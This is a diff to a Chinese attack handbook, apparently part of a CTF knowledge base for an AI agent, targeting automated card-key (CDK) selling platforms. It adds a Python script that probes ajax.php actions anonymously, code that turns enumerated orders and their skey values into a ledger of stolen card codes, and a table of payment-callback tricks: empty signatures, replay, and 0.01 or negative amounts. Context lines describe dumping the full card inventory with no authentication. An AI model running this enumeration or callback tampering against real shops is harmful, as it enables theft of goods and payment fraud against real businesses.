@@ -33,7 +33,7 @@ keywords:
   - "ajax.php"
   - "自动发卡"
   - "库存泄露"
-difficulty: "intermediate"
+difficulty: "advanced"
 tags:
   - "database"
   - "web"
@@ -44,7 +44,7 @@ tags:
   - "cdk"
 language: "zh-CN"
 last_updated: "2026-07-04"
-related_articles: []
+related_articles: ["ctf-website/12-payment/platform-fingerprints", "ctf-website/12-payment/payment-digital-goods", "ctf-website/12-payment/payment-callback-async", "ctf-website/24-database/05-backup-log-leak"]
 ---
 # Card-Selling Platform Exploitation — 自动发卡平台攻击手册
 
@@ -115,7 +115,7 @@ Host: target.com
 
 **效果**：单次请求返回全库 CDK（10万+ 条），响应可达 25MB+。无需 Cookie、Token 或任何认证。
 
-### 检测方法
+### 打点方法
 
 1. 枚举 `mod` 参数值（如 `faka`, `kami`, `cdk`, `card`, `query`）
 2. 观察响应中是否包含多段错误页 + 数据页（堆叠输出特征）
@@ -317,9 +317,72 @@ XSS 链路:
 | `getcount` | GET/POST + AJAX 头 | 订单数/金额/库存统计 | 估算枚举范围 |
 | 支付回调 | 空签名/错误签名/重放 | 订单状态或发货状态变化 | 支付绕过 |
 
+## 9. 自动化枚举与回调链
+
+发卡平台的执行节奏是：先拿平台指纹和 API action，再用匿名 session 打订单查询，抽 `id+skey` 后进详情，最后对照发货账本和回调接口。不要只证明单个 IDOR，要把订单、卡密、金额、支付状态连成一张表。
+
+### 9.1 API action 枚举器
+
+```python
+# card_platform_action_probe.py — 发卡平台 action 差分
+import hashlib
+import json
+import requests
+
+ACTIONS = ["gettool", "getcount", "query", "order", "pay", "settle", "login", "captcha"]
+
+def probe(base):
+    s = requests.Session()
+    rows = []
+    for act in ACTIONS:
+        for method in ("GET", "POST"):
+            url = base.rstrip("/") + f"/ajax.php?act={act}"
+            headers = {"Referer": base, "X-Requested-With": "XMLHttpRequest"}
+            r = s.request(method, url, headers=headers, data={"page": 1, "type": "qq", "qq": "1"}, timeout=8)
+            rows.append({
+                "act": act,
+                "method": method,
+                "status": r.status_code,
+                "len": len(r.content),
+                "hash": hashlib.sha1(r.content[:4096]).hexdigest(),
+                "json_like": r.text.strip().startswith(("{", "[")),
+                "markers": [m for m in ("skey", "kminfo", "result", "money", "isnext", "CDK") if m in r.text],
+            })
+    print(json.dumps(rows, ensure_ascii=False, indent=2))
+```
+
+### 9.2 订单枚举到卡密账本
+
+```python
+# card_order_ledger.py — query/order 二跳合并
+def normalize_order(row):
+    return {
+        "id": row.get("id") or row.get("orderid"),
+        "skey": row.get("skey"),
+        "product": row.get("name") or row.get("goods"),
+        "money": row.get("money") or row.get("price"),
+        "status": row.get("status"),
+        "card_marker": bool(row.get("result") or row.get("kminfo")),
+    }
+```
+
+账本字段：`order_id,skey,product,money,status,result_hash,kminfo_hash,input,query_page,detail_status`。成功样本是匿名枚举能稳定得到 `skey`，详情接口返回卡密或下载信息，且字段能与商品/金额/状态对齐。
+
+### 9.3 回调链分叉
+
+| 回调信号 | 变体 | 判定 |
+|---|---|---|
+| `notify.php` 返回签名失败 | 正确字段 + 错误 sign | 只证明接口存在 |
+| `sign_type` 可控 | MD5/HMAC/空值切换 | 转签名实现缺陷 |
+| `out_trade_no` 可枚举 | 已存在订单 + 新 `transaction_id` | 转重放/幂等 |
+| `money/total_fee` 被业务采用 | 0.01 / 原价 / 负数 | 转金额字段优先级 |
+| 回调后发货 | 订单状态、卡密、余额变化 | 链路成立 |
+
+Evidence 新增 `card_action_matrix.json`、`card_order_ledger.csv`、`card_callback_diff.json`。
+
 ## Evidence
 
-| 风险点 | 证据 |
+| 链路 | 证据 |
 |--------|------|
 | 全量库存泄露 | `?mod=faka&action=show` 请求/响应、CDK 字段字段样例、响应条数 |
 | IDOR 订单枚举 | `act=query` 页码、匿名 Session、`isnext` 翻页证据、订单 ID 范围 |
@@ -337,7 +400,7 @@ XSS 链路:
 | 工具执行 | `run_ctf_tool` | 调用枚举脚本、Playwright/XSS 验证或 Burp 导出复放 |
 | 证据记录 | `workspace_write_text` | 保存订单、CDK 字段、请求响应与约束对比 |
 
-## 9. 关联技术
+## 10. 关联技术
 
 - [[sqli-nosqli]] — WAF 绕过与 SQL 注入
 - [[01-idor-enumeration]] — IDOR 枚举技术
